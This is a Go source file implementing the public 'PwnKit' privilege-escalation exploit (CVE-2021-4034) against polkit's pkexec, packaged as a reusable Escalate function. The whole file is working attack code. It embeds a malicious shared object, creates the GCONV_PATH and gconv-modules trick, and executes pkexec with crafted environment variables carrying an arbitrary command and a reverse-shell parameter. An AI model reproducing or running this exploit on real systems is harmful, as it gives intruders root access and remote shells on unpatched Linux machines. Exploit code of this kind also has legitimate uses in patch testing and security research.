/*
	CVE-2021-4034 - "Pwnkit" - Go Edition

	Credits:
		https://github.com/An00bRektn/CVE-2021-4034
		https://github.com/PeterGottesman/pwnkit-exploit
		https://github.com/dzonerzy/poc-cve-2021-4034
		https://github.com/berdav/CVE-2021-4034
		https://github.com/arthepsy/CVE-2021-4034
		https://github.com/g1f1/blasty-vs-pkexec.c
*/

package go_PwnKit

import (
	_ "embed"
	"fmt"
	"os"
	"syscall"
)

//go:embed internal/PWN.so
var malici0usSo []byte

func check(e error) {
	if e != nil {
		panic(e)
	}
}

func Escalate(command string, reverseShell string) {
	dir, err := os.MkdirTemp("", "pkexec-")
	check(err)
	os.Chdir(dir)

	// fake executable
	os.Mkdir("GCONV_PATH=.", 0755)
	f, err := os.Create("GCONV_PATH=./gconv")
	check(err)
	f.Close()
	os.Chmod("GCONV_PATH=./gconv", 0755)

	err = os.Mkdir("gconv", 0755)
	check(err)

	evilModule := []byte("module UNICODE// ZT// PWN 1\n")
	err = os.WriteFile("gconv/gconv-modules", evilModule, 0755)
	check(err)

	// Creating the shared object which will pop the shell
	err = os.WriteFile("gconv/PWN.so", malici0usSo, 0755)
	check(err)

	envp := []string{
		"gconv",
		"PATH=GCONV_PATH=.",
		"CHARSET=ZT",
		"SHELL=ultra_attack",
		"GIO_USE_VFS=",
		fmt.Sprintf("COMMAND=\"%s\"", command), // passing arguments through environment variables
		fmt.Sprintf("PKDIR=%s", dir),
		fmt.Sprintf("REV=%s", reverseShell),
	}

	syscall.Exec("/usr/bin/pkexec", nil, envp)
}
